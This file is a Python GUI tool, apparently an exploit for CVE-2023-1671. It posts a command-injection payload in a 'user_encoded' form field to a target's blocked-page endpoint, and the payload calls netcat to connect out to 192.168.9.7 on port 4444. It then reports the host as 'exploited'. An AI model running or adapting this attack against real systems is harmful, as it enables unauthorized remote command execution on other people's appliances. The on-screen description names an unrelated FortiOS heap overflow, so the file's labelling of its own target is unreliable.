import requests
import random
import base64
import socket
import time
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
import requests
import string
def Main():
    root = tkinter.Tk()
    root.title("CVE_2023_1671 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        host = inp
        def exploit(host):
            payload = f"$(echo -n \"';nc 192.168.9.7 4444 #'\" | base64)"
            data = {
                'args_reason': 'filetypewarn',
                'url': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
                'filetype': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
                'user': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
                'user_encoded': payload
            }

            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "curl/8.0.1"
            }

            try:
                response = requests.post(f'https://{host}/index.php?c=blocked&action=continue', headers=headers, data=data, verify=False, timeout=30)

                if response.status_code == 200:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, f'Host {host} has been exploited\n')
                    txtarea.insert(END, "---------------------------------------------------------------------------\n")
                    txtarea.insert(END, 'response code :\n')
                    txtarea.insert(END, "---------------------------------------------------------------------------\n")
                    txtarea.insert(END, response)
                    txtarea.insert(END, "\n---------------------------------------------------------------------------")
                    txtarea.insert(END, '\n\n response text :\n')
                    txtarea.insert(END, "======================================================================================================================\n")
                    txtarea.insert(END, response.text)
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')
                else:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, f'Exploit unsuccessful on host {host}, status code {response.status_code}')
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')
            
            except requests.exceptions.Timeout:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, f'Timeout on host {host}, moving on to next host')
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')

        
            except requests.exceptions.RequestException as e:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, f'Error on host {host}: {e}')
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')

        exploit(host)  
    Hacher = Label(root, text="A heap-based buffer overflow vulnerability [CWE-122] in FortiOS SSL-VPN 7.2.0 through \n7.2.2, 7.0.0 through 7.0.8, 6.4.0 through 6.4.10, 6.2.0 through 6.2.11, 6.0.15 and \nearlier and FortiProxy SSL-VPN 7.2.0 through 7.2.1, 7.0.7 and earlier may allow a remote\n unauthenticated attacker to execute arbitrary code or \ncommands via specifically crafted requests.").pack()  
    Hacher = Label(root, text="Enter domin www.example.com : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
